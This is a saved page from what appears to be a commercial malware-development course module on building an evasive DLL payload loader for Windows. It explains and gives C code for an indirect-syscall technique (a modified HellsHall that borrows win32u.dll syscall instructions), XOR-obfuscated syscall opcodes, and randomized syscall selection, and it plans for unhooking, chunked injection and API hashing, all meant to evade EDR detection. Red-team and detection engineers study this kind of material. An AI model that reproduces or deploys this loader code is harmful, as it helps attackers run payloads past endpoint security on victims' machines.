             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./23/complete" method="POST">
  </form>
      <form id="uncomplete-module" action="./2#" method="POST">

      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./24.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>




      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
  </a></footer></template>

<div id="app-root">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="23_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 23 - Building An Evasive DLL Payload Loader
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="23_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="23_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="23_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="23_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="23_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/DllPayloadLoader" target="_blank">
                    <img src="23_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">

    
    


    
    

    
    <div id="module-content" class="transition-opacity duration-300 opacity-100">
        <h2 id="toc-heading-0">Building An Evasive DLL Payload Loader</h2>
<h3 id="toc-heading-1">Introduction</h3>
<p>Leading up to this module, the course has covered various individual 
evasion techniques but hasn't integrated them into practical real-world 
projects. However, in this module, readers will acquire the skills to 
develop a reliable and stealthy DLL payload loader. This module will not
 only introduce new concepts but also enhance previously taught evasion 
techniques, resulting in a more comprehensive and effective approach for
 each method.</p>
<h3 id="toc-heading-2">Benefits Of a DLL Loader</h3>
<p>The payload loader to be created will take the form of a DLL file for several reasons:</p>
<ul>
<li>
<p>DLLs can be discreetly loaded and executed by legitimate applications
 while they are running, rendering them less conspicuous compared to 
standalone EXE files.</p>
</li>
<li>
<p>They can be effectively used in DLL search order exploits, such as DLL sideloading.</p>
</li>
<li>
<p>DLLs offer better opsec persistence approaches when sideloaded.</p>
</li>
</ul>
<p>With that being said, the next section will dive into the loader's features.</p>
<h3 id="toc-heading-3">Loader's Capabilities</h3>
<p>The loader being built will have the following features:</p>
<ul>
<li>
<p>Indirect-Syscalls using an improved HellsHall implementation.</p>
</li>
<li>
<p>Dll Unhooking via the <code>\KnownDlls\</code> directory without using RWX memory permissions.</p>
</li>
<li>
<p>Payload injection by chunking, possibly evading EDR events filters.</p>
</li>
<li>
<p>Using custom AES encryption library.</p>
</li>
<li>
<p>Executing payload via <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pool-api" target="_blank">Thread Pool APIs</a>.</p>
</li>
<li>
<p>Obfuscating IAT using API hashing and API camouflage.</p>
</li>
<li>
<p>CRT library independent.</p>
</li>
</ul>
<h3 id="toc-heading-4">Improving HellsHall</h3>
<p>HellsHall, introduced in <em>Module 89: Indirect Syscalls - HellsHall</em>,
 serves the purpose of evading user-land hooking through the utilization
 of indirect syscalls. It accomplishes this by redirecting execution to a
 <code>syscall</code> instruction located within <code>ntdll.dll</code>, rather than executing it directly from the implementation's memory.</p>
<p>The DLL loader we're developing will leverage HellsHall, with a 
slight modification applied to it. This modification is related to the 
unhooking routine that will be using the <code>PAGE_READWRITE</code> (RW) memory permission, instead of using the <code>PAGE_EXECUTE_READWRITE</code> (RWX) permission. However, this choice comes with a limitation: this makes it impossible to execute anything within <code>ntdll.dll</code>'s address space.</p>
<p>In simpler terms, attempting to jump to a <code>syscall</code> instruction in <code>ntdll.dll</code> will trigger a <code>STATUS_ACCESS_VIOLATION</code>
 exception because an attempt was made to execute code in a 
non-executable memory region. To resolve this issue, the loader will 
need to find a <code>syscall</code> instruction situated outside of <code>ntdll.dll</code>'s address space.</p>
<p>To do this, the <code>win32u.dll</code> library will be used which contains syscall functions that have <code>syscall</code> instructions that our loader can leverage.</p>
<h3 id="toc-heading-5">Using Win32u.dll</h3>
<p>The <code>win32u.dll</code> library is a component of the Win32 subsystem, offering a range of user-mode graphics-related functions. Within <code>win32u.dll</code>, there are syscall functions that have <code>syscall</code>
 instructions that our loader can use when executing HellsHall. With 
that in mind, invoking a syscall within the loader will now take the 
following form:</p>
<img width="700px" alt="image" style="margin:auto" src="23_files/dllldr-165914382-cef5a4eb-e1e3-495f-9dce-e29119c0fd7f.png">
<p>Opening <code>win32u.dll</code> using the <em>HxD binary editor</em> allows one to see the <code>syscall ret</code> opcodes (<code>0F05C3</code>) which are the opcodes that our loader will jump to.</p>
<img width="1000" alt="image" style="margin:auto" src="23_files/dllldr-265595541-ebb3522d-7824-48c3-a2ee-502b9a709813.png">
<br>
<h3 id="toc-heading-6">HellsHall's New Functions</h3>
<p>The new HellsHall implementation will contain the following functions:</p>
<ul>
<li>
<p>A function that will calculate all the required virtual addresses of a
 specified DLL module. This function will be called twice, once for <code>ntdll.dll</code> and the other for <code>win32u.dll</code>.</p>
</li>
<li>
<p>A function that will search <code>win32u.dll</code>'s address space for <code>syscall</code> and <code>ret</code> instructions.</p>
</li>
<li>
<p>A function that will search <code>ntdll.dll</code>'s address space for the specified syscall's System Service Number (SSN).</p>
</li>
</ul>
<h3 id="toc-heading-7">Loading Win32u.dll</h3>
<p>Given the critical role of <code>win32u.dll</code> in the new 
HellsHall implementation, it is crucial to ensure the DLL is loaded in 
the local process before proceeding with any other actions. While it is 
possible to load <code>win32u.dll</code> at runtime using the <code>LoadLibrary</code> WinAPI, a better approach is to load it statically via the IAT of our implementation.</p>
<p>The function <code>AddWin32uToIat</code> shown below leverages the <a href="https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetfolderpathw" target="_blank">SHGetFolderPathW</a> WinAPI, which is exported from the <code>shell32.dll</code> DLL. Notably, <code>shell32.dll</code> itself loads the <code>win32u.dll</code> DLL for its internal functions, thus ensuring that <code>win32u.dll</code> will also be loaded upon our DLL file is loaded into a process.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// This function loads win32u.dll into the IAT</span>
VOID <span class="token function">AddWin32uToIat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	WCHAR szPath<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token function">SHGetFolderPathW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> CSIDL_MYVIDEO<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> szPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-8">MODULE_CONFIG Structure</h3>
<p>Part of our requirement in the updated HellsHall is to access exported functions by the <code>ntdll</code> and <code>win32u</code> DLLs. The <code>MODULE_CONFIG</code> structure is used for ease of accessing a DLL's virtual addresses without having to calculate it repeatedly. The <code>MODULE_CONFIG</code> structure is defined as follows:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_MODULE_CONFIG</span>
<span class="token punctuation">{</span>

    PDWORD      pdwArrayOfAddresses<span class="token punctuation">;</span> <span class="token comment">// The VA of the array of addresses of the DLL's exported functions    [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]</span>
    PDWORD      pdwArrayOfNames<span class="token punctuation">;</span>     <span class="token comment">// The VA of the array of names of the DLL's exported functions        [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNames]</span>
    PWORD       pwArrayOfOrdinals<span class="token punctuation">;</span>   <span class="token comment">// The VA of the array of ordinals of the DLL's exported functions     [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]    </span>
    DWORD       dwNumberOfNames<span class="token punctuation">;</span>     <span class="token comment">// The number of exported functions of the DLL                         [IMAGE_EXPORT_DIRECTORY.NumberOfNames]</span>
    ULONG_PTR   uModule<span class="token punctuation">;</span>             <span class="token comment">// The base address of the DLL - required to calculate future VAs      [BaseAddress]</span>
    BOOLEAN     bInitialized<span class="token punctuation">;</span>        <span class="token comment">// Set to TRUE if all members are initialized</span>

<span class="token punctuation">}</span> MODULE_CONFIG<span class="token punctuation">,</span> <span class="token operator">*</span>PMODULE_CONFIG<span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Given that two DLL libraries are involved in the updated HellsHall implementation, it's necessary to define two global <code>MODULE_CONFIG</code> structure variables.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// Global variables</span>
MODULE_CONFIG   g_NtdllConf   <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
MODULE_CONFIG   g_Win32uConf  <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-9">InitDllsConfigStructs Function</h3>
<p>The <code>InitDllsConfigStructs</code> function initializes <code>g_NtdllConf</code> and <code>g_Win32uConf</code>. It takes two parameters and returns <code>TRUE</code> when all members of the structure are populated; otherwise, it returns <code>FALSE</code>. The function's parameters are detailed below:</p>
<ul>
<li>
<p><code>pModuleConf</code> - A pointer to a <code>MODULE_CONFIG</code> structure to populate.</p>
</li>
<li>
<p><code>uBaseAddress</code> - A DLL's base address for populating the <code>MODULE_CONFIG</code> structure.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">InitDllsConfigStructs</span><span class="token punctuation">(</span>OUT PMODULE_CONFIG pModuleConf<span class="token punctuation">,</span> IN ULONG_PTR uBaseAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pModuleConf<span class="token operator">-&gt;</span>uModule <span class="token operator">=</span> uBaseAddress<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token comment">// Fetching the NT headers of the DLL</span>
    PIMAGE_NT_HEADERS pImgNtHdrs <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pModuleConf<span class="token operator">-&gt;</span>uModule <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pModuleConf<span class="token operator">-&gt;</span>uModule<span class="token punctuation">)</span><span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pImgNtHdrs<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token comment">// Fetching the export directory of the DLL</span>
    PIMAGE_EXPORT_DIRECTORY pImgExpDir <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pModuleConf<span class="token operator">-&gt;</span>uModule <span class="token operator">+</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Initalizing the 'MODULE_CONFIG' structure</span>
    pModuleConf<span class="token operator">-&gt;</span>dwNumberOfNames         <span class="token operator">=</span> pImgExpDir<span class="token operator">-&gt;</span>NumberOfNames<span class="token punctuation">;</span>
    pModuleConf<span class="token operator">-&gt;</span>pdwArrayOfNames         <span class="token operator">=</span> <span class="token punctuation">(</span> PDWORD <span class="token punctuation">)</span> <span class="token punctuation">(</span>pModuleConf<span class="token operator">-&gt;</span>uModule <span class="token operator">+</span> pImgExpDir<span class="token operator">-&gt;</span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span>
    pModuleConf<span class="token operator">-&gt;</span>pdwArrayOfAddresses     <span class="token operator">=</span> <span class="token punctuation">(</span> PDWORD <span class="token punctuation">)</span> <span class="token punctuation">(</span>pModuleConf<span class="token operator">-&gt;</span>uModule <span class="token operator">+</span> pImgExpDir<span class="token operator">-&gt;</span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span>
    pModuleConf<span class="token operator">-&gt;</span>pwArrayOfOrdinals       <span class="token operator">=</span> <span class="token punctuation">(</span> PWORD  <span class="token punctuation">)</span> <span class="token punctuation">(</span>pModuleConf<span class="token operator">-&gt;</span>uModule <span class="token operator">+</span> pImgExpDir<span class="token operator">-&gt;</span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Checking if all members are initialized</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pModuleConf<span class="token operator">-&gt;</span>dwNumberOfNames <span class="token operator">||</span> <span class="token operator">!</span>pModuleConf<span class="token operator">-&gt;</span>pdwArrayOfNames <span class="token operator">||</span> <span class="token operator">!</span>pModuleConf<span class="token operator">-&gt;</span>pdwArrayOfAddresses <span class="token operator">||</span> <span class="token operator">!</span>pModuleConf<span class="token operator">-&gt;</span>pwArrayOfOrdinals<span class="token punctuation">)</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    pModuleConf<span class="token operator">-&gt;</span>bInitialized <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
	
    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-10">FetchWin32uSyscallInst Function</h3>
<p>The <code>FetchWin32uSyscallInst</code> function serves the purpose of locating a <code>syscall</code> instruction in the exported functions of <code>win32u.dll</code> that is immediately followed by a <code>ret</code> instruction. <code>FetchWin32uSyscallInst</code> requires one parameter and returns <code>TRUE</code> if it was able to fetch a <code>syscall</code> instruction address. <code>FetchWin32uSyscallInst</code>'s required parameter is shown below:</p>
<ul>
<li><code>ppSyscallInstAddress</code> - Pointer to a <code>PVOID</code> variable that will be used to hold the address of the <code>syscall</code> instruction found.</li>
</ul>
<p>Additionally, the function incorporates several evasion techniques outlined below:</p>
<ul>
<li>
<p>Syscall obfuscation - The global variable <code>g_SYSCALL_OPCODE</code> is derived from the <code>syscall</code> instruction's opcode (<code>0x050F</code>) XOR'd with <code>0x25</code>. This operation obscures the original <code>syscall</code>
 instruction's opcode, making it less susceptible to detection by static
 scanners designed to identify direct syscall attempts. The use of the <code>volatile</code>
 keyword ensures that the XOR decryption operation is carried out at 
runtime rather than compile time, preventing the static exposure of the <code>syscall</code> instruction's opcode.</p>
</li>
<li>
<p>Returning different syscall instructions - To enhance evasion, the function tries to return a different <code>syscall</code> instruction each time it is invoked. This behavior is governed by the <code>iSeed</code> and <code>iCounter</code> variables. <code>iSeed</code> represents a randomly generated value during runtime, which the function utilizes to determine when to return. In other words, <code>FetchWin32uSyscallInst</code> will provide the address of the <code>syscall</code> instruction at the <code>iSeed</code>-th position, ensuring that it does not return the first encountered <code>syscall</code> instruction address on each call.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>	<span class="token macro-name">SYSCALL_STUB_SIZE</span>            <span class="token expression"><span class="token number">0x20</span>		</span><span class="token comment">// The size of a syscall stub is 32-byte</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RET_SYSCALL_OPCODE</span>           <span class="token expression"><span class="token number">0xC3</span></span></span>

<span class="token keyword">volatile</span> <span class="token keyword">unsigned</span> <span class="token keyword">short</span> g_SYSCALL_OPCODE <span class="token operator">=</span> <span class="token number">0x052A</span><span class="token punctuation">;</span>	<span class="token comment">// 0x050F ^ 0x25</span>

BOOL <span class="token function">FetchWin32uSyscallInst</span><span class="token punctuation">(</span>OUT PVOID<span class="token operator">*</span> ppSyscallInstAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    INT     iSeed       <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x10</span><span class="token punctuation">,</span>  <span class="token comment">// Between 0 and 15</span>
            iCounter    <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

    <span class="token comment">// Initialize win32u.dll structure </span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_Win32uConf<span class="token punctuation">.</span>bInitialized<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InitDllsConfigStructs</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_Win32uConf<span class="token punctuation">,</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>L<span class="token string">"win32u.dll"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> g_Win32uConf<span class="token punctuation">.</span>dwNumberOfNames<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        PCHAR pcFuncName    <span class="token operator">=</span> <span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span>g_Win32uConf<span class="token punctuation">.</span>uModule <span class="token operator">+</span> g_Win32uConf<span class="token punctuation">.</span>pdwArrayOfNames<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        PVOID pFuncAddress  <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>g_Win32uConf<span class="token punctuation">.</span>uModule <span class="token operator">+</span> g_Win32uConf<span class="token punctuation">.</span>pdwArrayOfAddresses<span class="token punctuation">[</span>g_Win32uConf<span class="token punctuation">.</span>pwArrayOfOrdinals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

       <span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;</span> SYSCALL_STUB_SIZE<span class="token punctuation">;</span> ii<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

            <span class="token comment">// Search for 'syscall' instruction</span>
            <span class="token comment">// 'g_SYSCALL_OPCODE' is 0x050F ^ 0x25, thus XOR'ing it with 0x25 now</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>g_SYSCALL_OPCODE <span class="token operator">^</span> <span class="token number">0x25</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> ii <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> RET_SYSCALL_OPCODE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// Used to determine a random 'syscall' instruction address</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>iCounter <span class="token operator">==</span> iSeed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token operator">*</span>ppSyscallInstAddress <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFuncAddress <span class="token operator">+</span> ii<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                iCounter<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>ppSyscallInstAddress<span class="token punctuation">)</span>
            <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-11">Updating FetchNtSyscall</h3>
<p>The final function in the updated HellsHall implementation, called <code>FetchNtSyscall</code>, closely resembles the original one in <em>Module 89: Indirect Syscalls - HellsHall</em>, with a minor modification. In the current version, the <code>FetchNtSyscall</code> function will invoke <code>FetchWin32uSyscallInst</code> to retrieve the address of the <code>syscall</code> instruction from the memory space of <code>win32u.dll</code> rather than searching within <code>ntdll.dll</code>. <code>FetchNtSyscall</code> expects two parameters:</p>
<ul>
<li>
<p><code>dwSysHash</code> - This parameter represents the hash value of the syscall for which the SSN needs to be fetched.</p>
</li>
<li>
<p><code>pNtSys</code> - This is a pointer to an <code>NT_SYSCALL</code> structure that encapsulates all the necessary details for executing an indirect syscall.</p>
</li>
</ul>
<h4 id="toc-heading-12">NT_SYSCAL Structure</h4>
<p>The <code>NT_SYSCALL</code> structure is shown below:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_NT_SYSCALL</span>
<span class="token punctuation">{</span>
    DWORD dwSSn<span class="token punctuation">;</span>                    <span class="token comment">// Syscall number</span>
    DWORD dwSyscallHash<span class="token punctuation">;</span>            <span class="token comment">// Syscall hash value</span>
    PVOID pSyscallInstAddress<span class="token punctuation">;</span>      <span class="token comment">// Address of a random 'syscall' instruction in win32u.dll    </span>

<span class="token punctuation">}</span> NT_SYSCALL<span class="token punctuation">,</span> <span class="token operator">*</span> PNT_SYSCALL<span class="token punctuation">;</span>
